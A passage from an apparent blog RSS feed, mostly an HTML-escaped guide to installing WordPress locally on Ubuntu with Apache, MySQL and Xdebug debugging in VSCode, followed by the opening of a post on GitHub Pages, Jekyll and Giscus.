/srv/www&#xA;curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Download a specific version:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;Installing from &lt;code&gt;wordpress.org&lt;/code&gt; is the most reliable and safest approach:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ubuntu has a &lt;code&gt;wordpress&lt;/code&gt; package in its repository, but it is often outdated compared to the official release.&lt;/li&gt;&#xA;&lt;li&gt;The WordPress community only supports installations from the official source.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-apache-for-wordpress&#34;&gt;&lt;span&gt;Configure Apache for WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-apache-for-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Create &amp;amp; edit &lt;code&gt;/etc/apache2/sites-available/wordpress.conf&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo nano /etc/apache2/sites-available/wordpress.conf&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Paste the following content in:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;VirtualHost *:80&amp;gt;&#xA;    DocumentRoot /srv/www/wordpress&#xA;    &amp;lt;Directory /srv/www/wordpress&amp;gt;&#xA;        Options FollowSymLinks&#xA;        AllowOverride Limit Options FileInfo&#xA;        DirectoryIndex index.php&#xA;        Require all granted&#xA;    &amp;lt;/Directory&amp;gt;&#xA;&#xA;    &amp;lt;Directory /srv/www/wordpress/wp-content&amp;gt;&#xA;        Options FollowSymLinks&#xA;        Require all granted&#xA;    &amp;lt;/Directory&amp;gt;&#xA;&amp;lt;/VirtualHost&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Enable the site:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo a2ensite wordpress&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Enable rewrite module:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo a2enmod rewrite&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(Optional) Disable default site:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo a2dissite 000-default&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Reload Apache:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo service apache2 reload&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-database&#34;&gt;&lt;span&gt;Configure Database&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-database&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;sudo mysql -u root&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;CREATE DATABASE wordpress;&#xA;CREATE USER wordpress@localhost IDENTIFIED BY &amp;#39;&amp;lt;your-password&amp;gt;&amp;#39;;&#xA;GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost;&#xA;FLUSH PRIVILEGES;&#xA;quit&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Restart MySQL:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo service mysql start&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-wordpress-to-connect-to-the-database&#34;&gt;&lt;span&gt;Configure WordPress to Connect to the Database&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-wordpress-to-connect-to-the-database&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Copy config file:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Edit database info:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo -u www-data sed -i &amp;#39;s/database_name_here/wordpress/&amp;#39; /srv/www/wordpress/wp-config.php&#xA;sudo -u www-data sed -i &amp;#39;s/username_here/wordpress/&amp;#39; /srv/www/wordpress/wp-config.php&#xA;sudo -u www-data sed -i &amp;#39;s/password_here/&amp;lt;your-password&amp;gt;/&amp;#39; /srv/www/wordpress/wp-config.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Add secret keys and salts from: &lt;a href=&#34;https://api.wordpress.org/secret-key/1.1/salt/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://api.wordpress.org/secret-key/1.1/salt/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo nano /srv/www/wordpress/wp-config.php&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-wordpress&#34;&gt;&lt;span&gt;Configure WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Visit &lt;a href=&#34;http://localhost&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost&lt;/a&gt; and set site title, username, password, and admin email.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://ubuntucommunity.s3.us-east-2.amazonaws.com/original/2X/e/ebe4d6066e0c32f14beca85ffd53e5915a4ab278.png&#39; alt=&#34;Configure WordPress&#34;&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;setup-debug-on-vscode&#34;&gt;&lt;span&gt;Setup Debug on VSCode&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-debug-on-vscode&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;add-php-debug-extension-on-vscode&#34;&gt;&lt;span&gt;Add PHP Debug Extension on VSCode&lt;/span&gt;&#xA;  &lt;a href=&#34;#add-php-debug-extension-on-vscode&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Go to &lt;strong&gt;Extensions (Ctrl+Shift+X)&lt;/strong&gt; → search &lt;strong&gt;PHP Debug (by Felix Becker)&lt;/strong&gt; → &lt;strong&gt;Install&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;install-xdebug-on-ubuntu&#34;&gt;&lt;span&gt;Install Xdebug on Ubuntu&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-xdebug-on-ubuntu&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;sudo apt install php-xdebug -y&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Check installation:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;php -v&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-xdebug&#34;&gt;&lt;span&gt;Configure Xdebug&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-xdebug&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;sudo nano /etc/php/&amp;lt;version&amp;gt;/apache2/php.ini&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Append:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;zend_extension=xdebug.so&#xA;xdebug.mode=debug&#xA;xdebug.start_with_request=yes&#xA;xdebug.client_host=127.0.0.1&#xA;xdebug.client_port=9003&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Restart Apache:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo systemctl restart apache2&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-vscode-launchjson&#34;&gt;&lt;span&gt;Configure VSCode &lt;code&gt;launch.json&lt;/code&gt;&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-vscode-launchjson&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Open WordPress folder in VSCode:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;code /srv/www/wordpress&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Create &lt;code&gt;.vscode/launch.json&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;version&amp;#34;: &amp;#34;0.2.0&amp;#34;,&#xA;  &amp;#34;configurations&amp;#34;: [&#xA;    {&#xA;      &amp;#34;name&amp;#34;: &amp;#34;Listen for Xdebug&amp;#34;,&#xA;      &amp;#34;type&amp;#34;: &amp;#34;php&amp;#34;,&#xA;      &amp;#34;request&amp;#34;: &amp;#34;launch&amp;#34;,&#xA;      &amp;#34;port&amp;#34;: 9003,&#xA;      &amp;#34;pathMappings&amp;#34;: {&#xA;        &amp;#34;/srv/www/wordpress&amp;#34;: &amp;#34;${workspaceFolder}&amp;#34;&#xA;      }&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;extend&#34;&gt;&lt;span&gt;Extend&lt;/span&gt;&#xA;  &lt;a href=&#34;#extend&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;required-version&#34;&gt;&lt;span&gt;Required Version&lt;/span&gt;&#xA;  &lt;a href=&#34;#required-version&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Each WordPress version usually requires a specific PHP version. Always check compatibility.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;wordpress-auto-update&#34;&gt;&lt;span&gt;WordPress Auto Update&lt;/span&gt;&#xA;  &lt;a href=&#34;#wordpress-auto-update&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Since &lt;strong&gt;WordPress 3.7&lt;/strong&gt; (2013), WordPress supports &lt;strong&gt;automatic background updates&lt;/strong&gt; for:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Security releases&lt;/li&gt;&#xA;&lt;li&gt;Maintenance releases&lt;/li&gt;&#xA;&lt;li&gt;(Major versions require explicit opt-in)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;To disable auto updates, add to &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;define( &amp;#39;WP_AUTO_UPDATE_CORE&amp;#39;, false );&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;increase-plugin-upload-size&#34;&gt;&lt;span&gt;Increase Plugin Upload Size&lt;/span&gt;&#xA;  &lt;a href=&#34;#increase-plugin-upload-size&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Paste below content into &lt;code&gt;php.ini&lt;/code&gt; file.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;upload_max_filesize = 64M&#xA;post_max_size = 64M&#xA;memory_limit = 128M&#xA;max_execution_time = 300&#xA;max_input_time = 300&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;</description>
    </item>
    <item>
      <title>Github Pages with Jekyll themes and Giscus</title>
      <link>http://localhost:1313/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/</link>
      <pubDate>Tue, 19 Aug 2025 01:10:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/</guid>
      <category domain="http://localhost:1313/categories/web/">Web</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;When starting a personal blog, there are three tools you should know: GitHub Pages, Jekyll, and Giscus.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Github Pages&lt;/strong&gt;: A free service from GitHub that allows you to deploy static websites directly from a repository. Just push your code to GitHub, and your blog will automatically go live on the Internet without needing your own server.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Jekyll&lt;/strong&gt;: A static site generator integrated with GitHub Pages. Jekyll makes it easy to create blogs from Markdown files, organize content using templates, and apply ready-to-use themes.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Giscus&lt;/strong&gt;: A modern comment system based on GitHub Discussions. Instead of using external services like Disqus, you can leverage GitHub to manage comments, keeping it lightweight and developer-friendly.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;A &lt;a 